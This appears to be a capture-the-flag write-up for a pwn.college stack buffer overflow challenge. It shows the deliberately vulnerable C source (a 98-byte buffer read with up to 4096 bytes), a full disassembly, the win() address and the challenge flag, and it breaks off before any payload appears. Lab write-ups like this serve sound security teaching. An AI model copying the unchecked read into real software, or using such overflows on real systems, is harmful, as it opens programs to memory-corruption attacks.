# First OverFlow (hard)

# The flag : `pwn.college{gw_GIYEwaLZtw8v-BaLkcf1ZMna.0FM5IDLzQjN0czW}`

- Lets look at the code first and add some important comments : 
```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

void bin_padding()
{
    asm volatile (".rept 3669; nop; .endr"); // bunch of padding
}

void win() // imp1
{
    static char flag[256]; 
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[98]; // 98 bytes of input
        int win_variable;
    } data  = {0} ;

    unsigned long size = 0;

    size = 4096;

    printf("Send your payload (up to %lu bytes)!\n", size); // we can send upto 4096 bytes
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
} // we override the win variable to be more than 0 again 

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

lets look at the objectdump : 

```python

hacker@binary-exploitation~your-first-overflow-hard:/challenge$ objdump -M intel -d binary-exploitation-first-overflow

binary-exploitation-first-overflow:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:       f3 0f 1e fa             endbr64
  401004:       48 83 ec 08             sub    rsp,0x8
  401008:       48 8b 05 e9 3f 00 00    mov    rax,QWORD PTR [rip+0x3fe9]        # 404ff8 <__gmon_start__>
  40100f:       48 85 c0                test   rax,rax
  401012:       74 02                   je     401016 <_init+0x16>
  401014:       ff d0                   call   rax
  401016:       48 83 c4 08             add    rsp,0x8
  40101a:       c3                      ret

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:       ff 35 62 3f 00 00       push   QWORD PTR [rip+0x3f62]        # 404f88 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:       f2 ff 25 63 3f 00 00    bnd jmp QWORD PTR [rip+0x3f63]        # 404f90 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:       0f 1f 00                nop    DWORD PTR [rax]
  401030:       f3 0f 1e fa             endbr64
  401034:       68 00 00 00 00          push   0x0
  401039:       f2 e9 e1 ff ff ff       bnd jmp 401020 <.plt>
  40103f:       90                      nop
  401040:       f3 0f 1e fa             endbr64
  401044:       68 01 00 00 00          push   0x1
  401049:       f2 e9 d1 ff ff ff       bnd jmp 401020 <.plt>
  40104f:       90                      nop
  401050:       f3 0f 1e fa             endbr64
  401054:       68 02 00 00 00          push   0x2
  401059:       f2 e9 c1 ff ff ff       bnd jmp 401020 <.plt>
  40105f:       90                      nop
  401060:       f3 0f 1e fa             endbr64
  401064:       68 03 00 00 00          push   0x3
  401069:       f2 e9 b1 ff ff ff       bnd jmp 401020 <.plt>
  40106f:       90                      nop
  401070:       f3 0f 1e fa             endbr64
  401074:       68 04 00 00 00          push   0x4
  401079:       f2 e9 a1 ff ff ff       bnd jmp 401020 <.plt>
  40107f:       90                      nop
  401080:       f3 0f 1e fa             endbr64
  401084:       68 05 00 00 00          push   0x5
  401089:       f2 e9 91 ff ff ff       bnd jmp 401020 <.plt>
  40108f:       90                      nop
  401090:       f3 0f 1e fa             endbr64
  401094:       68 06 00 00 00          push   0x6
  401099:       f2 e9 81 ff ff ff       bnd jmp 401020 <.plt>
  40109f:       90                      nop
  4010a0:       f3 0f 1e fa             endbr64
  4010a4:       68 07 00 00 00          push   0x7
  4010a9:       f2 e9 71 ff ff ff       bnd jmp 401020 <.plt>
  4010af:       90                      nop
  4010b0:       f3 0f 1e fa             endbr64
  4010b4:       68 08 00 00 00          push   0x8
  4010b9:       f2 e9 61 ff ff ff       bnd jmp 401020 <.plt>
  4010bf:       90                      nop
  4010c0:       f3 0f 1e fa             endbr64
  4010c4:       68 09 00 00 00          push   0x9
  4010c9:       f2 e9 51 ff ff ff       bnd jmp 401020 <.plt>
  4010cf:       90                      nop
  4010d0:       f3 0f 1e fa             endbr64
  4010d4:       68 0a 00 00 00          push   0xa
  4010d9:       f2 e9 41 ff ff ff       bnd jmp 401020 <.plt>
  4010df:       90                      nop

Disassembly of section .plt.sec:

00000000004010e0 <__errno_location@plt>:
  4010e0:       f3 0f 1e fa             endbr64
  4010e4:       f2 ff 25 ad 3e 00 00    bnd jmp QWORD PTR [rip+0x3ead]        # 404f98 <__errno_location@GLIBC_2.2.5>
  4010eb:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

00000000004010f0 <puts@plt>:
  4010f0:       f3 0f 1e fa             endbr64
  4010f4:       f2 ff 25 a5 3e 00 00    bnd jmp QWORD PTR [rip+0x3ea5]        # 404fa0 <puts@GLIBC_2.2.5>
  4010fb:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401100 <write@plt>:
  401100:       f3 0f 1e fa             endbr64
  401104:       f2 ff 25 9d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e9d]        # 404fa8 <write@GLIBC_2.2.5>
  40110b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401110 <__stack_chk_fail@plt>:
  401110:       f3 0f 1e fa             endbr64
  401114:       f2 ff 25 95 3e 00 00    bnd jmp QWORD PTR [rip+0x3e95]        # 404fb0 <__stack_chk_fail@GLIBC_2.4>
  40111b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401120 <printf@plt>:
  401120:       f3 0f 1e fa             endbr64
  401124:       f2 ff 25 8d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e8d]        # 404fb8 <printf@GLIBC_2.2.5>
  40112b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401130 <geteuid@plt>:
  401130:       f3 0f 1e fa             endbr64
  401134:       f2 ff 25 85 3e 00 00    bnd jmp QWORD PTR [rip+0x3e85]        # 404fc0 <geteuid@GLIBC_2.2.5>
  40113b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401140 <read@plt>:
  401140:       f3 0f 1e fa             endbr64
  401144:       f2 ff 25 7d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e7d]        # 404fc8 <read@GLIBC_2.2.5>
  40114b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401150 <setvbuf@plt>:
  401150:       f3 0f 1e fa             endbr64
  401154:       f2 ff 25 75 3e 00 00    bnd jmp QWORD PTR [rip+0x3e75]        # 404fd0 <setvbuf@GLIBC_2.2.5>
  40115b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401160 <open@plt>:
  401160:       f3 0f 1e fa             endbr64
  401164:       f2 ff 25 6d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e6d]        # 404fd8 <open@GLIBC_2.2.5>
  40116b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401170 <exit@plt>:
  401170:       f3 0f 1e fa             endbr64
  401174:       f2 ff 25 65 3e 00 00    bnd jmp QWORD PTR [rip+0x3e65]        # 404fe0 <exit@GLIBC_2.2.5>
  40117b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401180 <strerror@plt>:
  401180:       f3 0f 1e fa             endbr64
  401184:       f2 ff 25 5d 3e 00 00    bnd jmp QWORD PTR [rip+0x3e5d]        # 404fe8 <strerror@GLIBC_2.2.5>
  40118b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000401190 <_start>:
  401190:       f3 0f 1e fa             endbr64
  401194:       31 ed                   xor    ebp,ebp
  401196:       49 89 d1                mov    r9,rdx
  401199:       5e                      pop    rsi
  40119a:       48 89 e2                mov    rdx,rsp
  40119d:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
  4011a1:       50                      push   rax
  4011a2:       54                      push   rsp
  4011a3:       49 c7 c0 f0 23 40 00    mov    r8,0x4023f0
  4011aa:       48 c7 c1 80 23 40 00    mov    rcx,0x402380
  4011b1:       48 c7 c7 cd 22 40 00    mov    rdi,0x4022cd
  4011b8:       ff 15 32 3e 00 00       call   QWORD PTR [rip+0x3e32]        # 404ff0 <__libc_start_main@GLIBC_2.2.5>
  4011be:       f4                      hlt
  4011bf:       90                      nop

00000000004011c0 <_dl_relocate_static_pie>:
  4011c0:       f3 0f 1e fa             endbr64
  4011c4:       c3                      ret
  4011c5:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  4011cc:       00 00 00
  4011cf:       90                      nop

00000000004011d0 <deregister_tm_clones>:
  4011d0:       b8 10 50 40 00          mov    eax,0x405010
  4011d5:       48 3d 10 50 40 00       cmp    rax,0x405010
  4011db:       74 13                   je     4011f0 <deregister_tm_clones+0x20>
  4011dd:       b8 00 00 00 00          mov    eax,0x0
  4011e2:       48 85 c0                test   rax,rax
  4011e5:       74 09                   je     4011f0 <deregister_tm_clones+0x20>
  4011e7:       bf 10 50 40 00          mov    edi,0x405010
  4011ec:       ff e0                   jmp    rax
  4011ee:       66 90                   xchg   ax,ax
  4011f0:       c3                      ret
  4011f1:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  4011f8:       00 00 00 00
  4011fc:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401200 <register_tm_clones>:
  401200:       be 10 50 40 00          mov    esi,0x405010
  401205:       48 81 ee 10 50 40 00    sub    rsi,0x405010
  40120c:       48 89 f0                mov    rax,rsi
  40120f:       48 c1 ee 3f             shr    rsi,0x3f
  401213:       48 c1 f8 03             sar    rax,0x3
  401217:       48 01 c6                add    rsi,rax
  40121a:       48 d1 fe                sar    rsi,1
  40121d:       74 11                   je     401230 <register_tm_clones+0x30>
  40121f:       b8 00 00 00 00          mov    eax,0x0
  401224:       48 85 c0                test   rax,rax
  401227:       74 07                   je     401230 <register_tm_clones+0x30>
  401229:       bf 10 50 40 00          mov    edi,0x405010
  40122e:       ff e0                   jmp    rax
  401230:       c3                      ret
  401231:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401238:       00 00 00 00
  40123c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401240 <__do_global_dtors_aux>:
  401240:       f3 0f 1e fa             endbr64
  401244:       80 3d ed 3d 00 00 00    cmp    BYTE PTR [rip+0x3ded],0x0        # 405038 <completed.8061>
  40124b:       75 13                   jne    401260 <__do_global_dtors_aux+0x20>
  40124d:       55                      push   rbp
  40124e:       48 89 e5                mov    rbp,rsp
  401251:       e8 7a ff ff ff          call   4011d0 <deregister_tm_clones>
  401256:       c6 05 db 3d 00 00 01    mov    BYTE PTR [rip+0x3ddb],0x1        # 405038 <completed.8061>
  40125d:       5d                      pop    rbp
  40125e:       c3                      ret
  40125f:       90                      nop
  401260:       c3                      ret
  401261:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401268:       00 00 00 00
  40126c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401270 <frame_dummy>:
  401270:       f3 0f 1e fa             endbr64
  401274:       eb 8a                   jmp    401200 <register_tm_clones>

0000000000401276 <bin_padding>:
  401276:       f3 0f 1e fa             endbr64
  40127a:       55                      push   rbp
  40127b:       48 89 e5                mov    rbp,rsp
  40127e:       90                      nop
  40127f:       90                      nop
 

00000000004020d6 <win>:
  4020d6:       f3 0f 1e fa             endbr64
  4020da:       55                      push   rbp
  4020db:       48 89 e5                mov    rbp,rsp
  4020de:       48 8d 3d 23 0f 00 00    lea    rdi,[rip+0xf23]        # 403008 <_IO_stdin_used+0x8>
  4020e5:       e8 06 f0 ff ff          call   4010f0 <puts@plt>
  4020ea:       be 00 00 00 00          mov    esi,0x0
  4020ef:       48 8d 3d 2e 0f 00 00    lea    rdi,[rip+0xf2e]        # 403024 <_IO_stdin_used+0x24>
  4020f6:       b8 00 00 00 00          mov    eax,0x0
  4020fb:       e8 60 f0 ff ff          call   401160 <open@plt>
  402100:       89 05 3a 2f 00 00       mov    DWORD PTR [rip+0x2f3a],eax        # 405040 <flag_fd.5700>
  402106:       8b 05 34 2f 00 00       mov    eax,DWORD PTR [rip+0x2f34]        # 405040 <flag_fd.5700>
  40210c:       85 c0                   test   eax,eax
  40210e:       79 4d                   jns    40215d <win+0x87>
  402110:       e8 cb ef ff ff          call   4010e0 <__errno_location@plt>
  402115:       8b 00                   mov    eax,DWORD PTR [rax]
  402117:       89 c7                   mov    edi,eax
  402119:       e8 62 f0 ff ff          call   401180 <strerror@plt>
  40211e:       48 89 c6                mov    rsi,rax
  402121:       48 8d 3d 08 0f 00 00    lea    rdi,[rip+0xf08]        # 403030 <_IO_stdin_used+0x30>
  402128:       b8 00 00 00 00          mov    eax,0x0
  40212d:       e8 ee ef ff ff          call   401120 <printf@plt>
  402132:       e8 f9 ef ff ff          call   401130 <geteuid@plt>
  402137:       85 c0                   test   eax,eax
  402139:       74 18                   je     402153 <win+0x7d>
  40213b:       48 8d 3d 1e 0f 00 00    lea    rdi,[rip+0xf1e]        # 403060 <_IO_stdin_used+0x60>
  402142:       e8 a9 ef ff ff          call   4010f0 <puts@plt>
  402147:       48 8d 3d 3a 0f 00 00    lea    rdi,[rip+0xf3a]        # 403088 <_IO_stdin_used+0x88>
  40214e:       e8 9d ef ff ff          call   4010f0 <puts@plt>
  402153:       bf ff ff ff ff          mov    edi,0xffffffff
  402158:       e8 13 f0 ff ff          call   401170 <exit@plt>
  40215d:       8b 05 dd 2e 00 00       mov    eax,DWORD PTR [rip+0x2edd]        # 405040 <flag_fd.5700>
  402163:       ba 00 01 00 00          mov    edx,0x100
  402168:       48 8d 35 f1 2e 00 00    lea    rsi,[rip+0x2ef1]        # 405060 <flag.5699>
  40216f:       89 c7                   mov    edi,eax
  402171:       e8 ca ef ff ff          call   401140 <read@plt>
  402176:       89 05 e4 2f 00 00       mov    DWORD PTR [rip+0x2fe4],eax        # 405160 <flag_length.5701>
  40217c:       8b 05 de 2f 00 00       mov    eax,DWORD PTR [rip+0x2fde]        # 405160 <flag_length.5701>
  402182:       85 c0                   test   eax,eax
  402184:       7f 2c                   jg     4021b2 <win+0xdc>
  402186:       e8 55 ef ff ff          call   4010e0 <__errno_location@plt>
  40218b:       8b 00                   mov    eax,DWORD PTR [rax]
  40218d:       89 c7                   mov    edi,eax
  40218f:       e8 ec ef ff ff          call   401180 <strerror@plt>
  402194:       48 89 c6                mov    rsi,rax
  402197:       48 8d 3d 42 0f 00 00    lea    rdi,[rip+0xf42]        # 4030e0 <_IO_stdin_used+0xe0>
  40219e:       b8 00 00 00 00          mov    eax,0x0
  4021a3:       e8 78 ef ff ff          call   401120 <printf@plt>
  4021a8:       bf ff ff ff ff          mov    edi,0xffffffff
  4021ad:       e8 be ef ff ff          call   401170 <exit@plt>
  4021b2:       8b 05 a8 2f 00 00       mov    eax,DWORD PTR [rip+0x2fa8]        # 405160 <flag_length.5701>
  4021b8:       48 98                   cdqe
  4021ba:       48 89 c2                mov    rdx,rax
  4021bd:       48 8d 35 9c 2e 00 00    lea    rsi,[rip+0x2e9c]        # 405060 <flag.5699>
  4021c4:       bf 01 00 00 00          mov    edi,0x1
  4021c9:       e8 32 ef ff ff          call   401100 <write@plt>
  4021ce:       48 8d 3d 35 0f 00 00    lea    rdi,[rip+0xf35]        # 40310a <_IO_stdin_used+0x10a>
  4021d5:       e8 16 ef ff ff          call   4010f0 <puts@plt>
  4021da:       90                      nop
  4021db:       5d                      pop    rbp
  4021dc:       c3                      ret

00000000004021dd <challenge>:
  4021dd:       f3 0f 1e fa             endbr64
  4021e1:       55                      push   rbp
  4021e2:       48 89 e5                mov    rbp,rsp
  4021e5:       48 81 ec a0 00 00 00    sub    rsp,0xa0
  4021ec:       89 bd 7c ff ff ff       mov    DWORD PTR [rbp-0x84],edi
  4021f2:       48 89 b5 70 ff ff ff    mov    QWORD PTR [rbp-0x90],rsi
  4021f9:       48 89 95 68 ff ff ff    mov    QWORD PTR [rbp-0x98],rdx
  402200:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  402207:       00 00
  402209:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  40220d:       31 c0                   xor    eax,eax
  40220f:       48 8d 55 90             lea    rdx,[rbp-0x70]
  402213:       b8 00 00 00 00          mov    eax,0x0
  402218:       b9 0d 00 00 00          mov    ecx,0xd
  40221d:       48 89 d7                mov    rdi,rdx
  402220:       f3 48 ab                rep stos QWORD PTR es:[rdi],rax
  402223:       48 c7 45 88 00 00 00    mov    QWORD PTR [rbp-0x78],0x0
  40222a:       00
  40222b:       48 c7 45 88 00 10 00    mov    QWORD PTR [rbp-0x78],0x1000
  402232:       00
  402233:       48 8b 45 88             mov    rax,QWORD PTR [rbp-0x78]
  402237:       48 89 c6                mov    rsi,rax
  40223a:       48 8d 3d cf 0e 00 00    lea    rdi,[rip+0xecf]        # 403110 <_IO_stdin_used+0x110>
  402241:       b8 00 00 00 00          mov    eax,0x0
  402246:       e8 d5 ee ff ff          call   401120 <printf@plt>
  40224b:       48 8b 55 88             mov    rdx,QWORD PTR [rbp-0x78]
  40224f:       48 8d 45 90             lea    rax,[rbp-0x70]
  402253:       48 89 c6                mov    rsi,rax
  402256:       bf 00 00 00 00          mov    edi,0x0
  40225b:       e8 e0 ee ff ff          call   401140 <read@plt>
  402260:       89 45 84                mov    DWORD PTR [rbp-0x7c],eax
  402263:       83 7d 84 00             cmp    DWORD PTR [rbp-0x7c],0x0
  402267:       79 2c                   jns    402295 <challenge+0xb8>
  402269:       e8 72 ee ff ff          call   4010e0 <__errno_location@plt>
  40226e:       8b 00                   mov    eax,DWORD PTR [rax]
  402270:       89 c7                   mov    edi,eax
  402272:       e8 09 ef ff ff          call   401180 <strerror@plt>
  402277:       48 89 c6                mov    rsi,rax
  40227a:       48 8d 3d b7 0e 00 00    lea    rdi,[rip+0xeb7]        # 403138 <_IO_stdin_used+0x138>
  402281:       b8 00 00 00 00          mov    eax,0x0
  402286:       e8 95 ee ff ff          call   401120 <printf@plt>
  40228b:       bf 01 00 00 00          mov    edi,0x1
  402290:       e8 db ee ff ff          call   401170 <exit@plt>
  402295:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]
  402298:       85 c0                   test   eax,eax
  40229a:       74 0a                   je     4022a6 <challenge+0xc9>
  40229c:       b8 00 00 00 00          mov    eax,0x0
  4022a1:       e8 30 fe ff ff          call   4020d6 <win>
  4022a6:       48 8d 3d af 0e 00 00    lea    rdi,[rip+0xeaf]        # 40315c <_IO_stdin_used+0x15c>
  4022ad:       e8 3e ee ff ff          call   4010f0 <puts@plt>
  4022b2:       b8 00 00 00 00          mov    eax,0x0
  4022b7:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  4022bb:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  4022c2:       00 00
  4022c4:       74 05                   je     4022cb <challenge+0xee>
  4022c6:       e8 45 ee ff ff          call   401110 <__stack_chk_fail@plt>
  4022cb:       c9                      leave
  4022cc:       c3                      ret

00000000004022cd <main>:
  4022cd:       f3 0f 1e fa             endbr64
  4022d1:       55                      push   rbp
  4022d2:       48 89 e5                mov    rbp,rsp
  4022d5:       48 81 ec 00 10 00 00    sub    rsp,0x1000
  4022dc:       48 83 0c 24 00          or     QWORD PTR [rsp],0x0
  4022e1:       48 83 ec 30             sub    rsp,0x30
  4022e5:       89 bd ec ef ff ff       mov    DWORD PTR [rbp-0x1014],edi
  4022eb:       48 89 b5 e0 ef ff ff    mov    QWORD PTR [rbp-0x1020],rsi
  4022f2:       48 89 95 d8 ef ff ff    mov    QWORD PTR [rbp-0x1028],rdx
  4022f9:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  402300:       00 00
  402302:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  402306:       31 c0                   xor    eax,eax
  402308:       48 8b 05 21 2d 00 00    mov    rax,QWORD PTR [rip+0x2d21]        # 405030 <stdin@GLIBC_2.2.5>
  40230f:       b9 00 00 00 00          mov    ecx,0x0
  402314:       ba 02 00 00 00          mov    edx,0x2
  402319:       be 00 00 00 00          mov    esi,0x0
  40231e:       48 89 c7                mov    rdi,rax
  402321:       e8 2a ee ff ff          call   401150 <setvbuf@plt>
  402326:       48 8b 05 f3 2c 00 00    mov    rax,QWORD PTR [rip+0x2cf3]        # 405020 <stdout@GLIBC_2.2.5>
  40232d:       b9 00 00 00 00          mov    ecx,0x0
  402332:       ba 02 00 00 00          mov    edx,0x2
  402337:       be 00 00 00 00          mov    esi,0x0
  40233c:       48 89 c7                mov    rdi,rax
  40233f:       e8 0c ee ff ff          call   401150 <setvbuf@plt>
  402344:       48 8b 95 d8 ef ff ff    mov    rdx,QWORD PTR [rbp-0x1028]
  40234b:       48 8b 8d e0 ef ff ff    mov    rcx,QWORD PTR [rbp-0x1020]
  402352:       8b 85 ec ef ff ff       mov    eax,DWORD PTR [rbp-0x1014]
  402358:       48 89 ce                mov    rsi,rcx
  40235b:       89 c7                   mov    edi,eax
  40235d:       e8 7b fe ff ff          call   4021dd <challenge>
  402362:       b8 00 00 00 00          mov    eax,0x0
  402367:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  40236b:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  402372:       00 00
  402374:       74 05                   je     40237b <main+0xae>
  402376:       e8 95 ed ff ff          call   401110 <__stack_chk_fail@plt>
  40237b:       c9                      leave
  40237c:       c3                      ret
  40237d:       0f 1f 00                nop    DWORD PTR [rax]

0000000000402380 <__libc_csu_init>:
  402380:       f3 0f 1e fa             endbr64
  402384:       41 57                   push   r15
  402386:       4c 8d 3d f3 29 00 00    lea    r15,[rip+0x29f3]        # 404d80 <__frame_dummy_init_array_entry>
  40238d:       41 56                   push   r14
  40238f:       49 89 d6                mov    r14,rdx
  402392:       41 55                   push   r13
  402394:       49 89 f5                mov    r13,rsi
  402397:       41 54                   push   r12
  402399:       41 89 fc                mov    r12d,edi
  40239c:       55                      push   rbp
  40239d:       48 8d 2d e4 29 00 00    lea    rbp,[rip+0x29e4]        # 404d88 <__do_global_dtors_aux_fini_array_entry>
  4023a4:       53                      push   rbx
  4023a5:       4c 29 fd                sub    rbp,r15
  4023a8:       48 83 ec 08             sub    rsp,0x8
  4023ac:       e8 4f ec ff ff          call   401000 <_init>
  4023b1:       48 c1 fd 03             sar    rbp,0x3
  4023b5:       74 1f                   je     4023d6 <__libc_csu_init+0x56>
  4023b7:       31 db                   xor    ebx,ebx
  4023b9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
  4023c0:       4c 89 f2                mov    rdx,r14
  4023c3:       4c 89 ee                mov    rsi,r13
  4023c6:       44 89 e7                mov    edi,r12d
  4023c9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4023cd:       48 83 c3 01             add    rbx,0x1
  4023d1:       48 39 dd                cmp    rbp,rbx
  4023d4:       75 ea                   jne    4023c0 <__libc_csu_init+0x40>
  4023d6:       48 83 c4 08             add    rsp,0x8
  4023da:       5b                      pop    rbx
  4023db:       5d                      pop    rbp
  4023dc:       41 5c                   pop    r12
  4023de:       41 5d                   pop    r13
  4023e0:       41 5e                   pop    r14
  4023e2:       41 5f                   pop    r15
  4023e4:       c3                      ret
  4023e5:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  4023ec:       00 00 00 00

00000000004023f0 <__libc_csu_fini>:
  4023f0:       f3 0f 1e fa             endbr64
  4023f4:       c3                      ret

Disassembly of section .fini:

00000000004023f8 <_fini>:
  4023f8:       f3 0f 1e fa             endbr64
  4023fc:       48 83 ec 08             sub    rsp,0x8
  402400:       48 83 c4 08             add    rsp,0x8
  402404:       c3                      ret
```

- again we have two methods to solve this challenge,

- lets just override the win variable first


```python
00000000004020d6 <win>:
  4020d6:       f3 0f 1e fa             endbr64
  4020da:       55                      push   rbp
  4020db:       48 89 e5                mov    rbp,rsp
  4020de:       48 8d 3d 23 0f 00 00    lea    rdi,[rip+0xf23]        # 403008 <_IO_stdin_used+0x8>
  4020e5:       e8 06 f0 ff ff          call   4010f0 <puts@plt>
  4020ea:       be 00 00 00 00          mov    esi,0x0
  4020ef:       48 8d 3d 2e 0f 00 00    lea    rdi,[rip+0xf2e]        # 403024 <_IO_stdin_used+0x24>
  4020f6:       b8 00 00 00 00          mov    eax,0x0
  4020fb:       e8 60 f0 ff ff          call   401160 <open@plt>
  402100:       89 05 3a 2f 00 00       mov    DWORD PTR [rip+0x2f3a],eax        # 405040 <flag_fd.5700>
  402106:       8b 05 34 2f 00 00       mov    eax,DWORD PTR [rip+0x2f34]        # 405040 <flag_fd.5700>
  40210c:       85 c0                   test   eax,eax
  40210e:       79 4d                   jns    40215d <win+0x87>
  402110:       e8 cb ef ff ff          call   4010e0 <__errno_location@plt>
  402115:       8b 00                   mov    eax,DWORD PTR [rax]
  402117:       89 c7                   mov    edi,eax
  402119:       e8 62 f0 ff ff          call   401180 <strerror@plt>
  40211e:       48 89 c6                mov    rsi,rax
  402121:       48 8d 3d 08 0f 00 00    lea    rdi,[rip+0xf08]        # 403030 <_IO_stdin_used+0x30>
  402128:       b8 00 00 00 00          mov    eax,0x0
  40212d:       e8 ee ef ff ff          call   401120 <printf@plt>
  402132:       e8 f9 ef ff ff          call   401130 <geteuid@plt>
  402137:       85 c0                   test   eax,eax
  402139:       74 18                   je     402153 <win+0x7d>
  40213b:       48 8d 3d 1e 0f 00 00    lea    rdi,[rip+0xf1e]        # 403060 <_IO_stdin_used+0x60>
  402142:       e8 a9 ef ff ff          call   4010f0 <puts@plt>
  402147:       48 8d 3d 3a 0f 00 00    lea    rdi,[rip+0xf3a]        # 403088 <_IO_stdin_used+0x88>
  40214e:       e8 9d ef ff ff          call   4010f0 <puts@plt>
  402153:       bf ff ff ff ff          mov    edi,0xffffffff
  402158:       e8 13 f0 ff ff          call   401170 <exit@plt>
  40215d:       8b 05 dd 2e 00 00       mov    eax,DWORD PTR [rip+0x2edd]        # 405040 <flag_fd.5700>
  402163:       ba 00 01 00 00          mov    edx,0x100
  402168:       48 8d 35 f1 2e 00 00    lea    rsi,[rip+0x2ef1]        # 405060 <flag.5699>
  40216f:       89 c7                   mov    edi,eax
  402171:       e8 ca ef ff ff          call   401140 <read@plt>
  402176:       89 05 e4 2f 00 00       mov    DWORD PTR [rip+0x2fe4],eax        # 405160 <flag_length.5701>
  40217c:       8b 05 de 2f 00 00       mov    eax,DWORD PTR [rip+0x2fde]        # 405160 <flag_length.5701>
  402182:       85 c0                   test   eax,eax
  402184:       7f 2c                   jg     4021b2 <win+0xdc>
  402186:       e8 55 ef ff ff          call   4010e0 <__errno_location@plt>
  40218b:       8b 00                   mov    eax,DWORD PTR [rax]
  40218d:       89 c7                   mov    edi,eax
  40218f:       e8 ec ef ff ff          call   401180 <strerror@plt>
  402194:       48 89 c6                mov    rsi,rax
  402197:       48 8d 3d 42 0f 00 00    lea    rdi,[rip+0xf42]        # 4030e0 <_IO_stdin_used+0xe0>
  40219e:       b8 00 00 00 00          mov    eax,0x0
  4021a3:       e8 78 ef ff ff          call   401120 <printf@plt>
  4021a8:       bf ff ff ff ff          mov    edi,0xffffffff
  4021ad:       e8 be ef ff ff          call   401170 <exit@plt>
  4021b2:       8b 05 a8 2f 00 00       mov    eax,DWORD PTR [rip+0x2fa8]        # 405160 <flag_length.5701>
  4021b8:       48 98                   cdqe
  4021ba:       48 89 c2                mov    rdx,rax
  4021bd:       48 8d 35 9c 2e 00 00    lea    rsi,[rip+0x2e9c]        # 405060 <flag.5699>
  4021c4:       bf 01 00 00 00          mov    edi,0x1
  4021c9:       e8 32 ef ff ff          call   401100 <write@plt>
  4021ce:       48 8d 3d 35 0f 00 00    lea    rdi,[rip+0xf35]        # 40310a <_IO_stdin_used+0x10a>
  4021d5:       e8 16 ef ff ff          call   4010f0 <puts@plt>
  4021da:       90                      nop
  4021db:       5d                      pop    rbp
  4021dc:       c3                      ret

```



this is our win function at address - `4020d6`.

now lets look at challenge() : 
```
00000000004021dd <challenge>:
  4021dd:       f3 0f 1e fa             endbr64
  4021e1:       55                      push   rbp
  4021e2:       48 89 e5                mov    rbp,rsp
  4021e5:       48 81 ec a0 00 00 00    sub    rsp,0xa0
  4021ec:       89 bd 7c ff ff ff       mov    DWORD PTR [rbp-0x84],edi
  4021f2:       48 89 b5 70 ff ff ff    mov    QWORD PTR [rbp-0x90],rsi
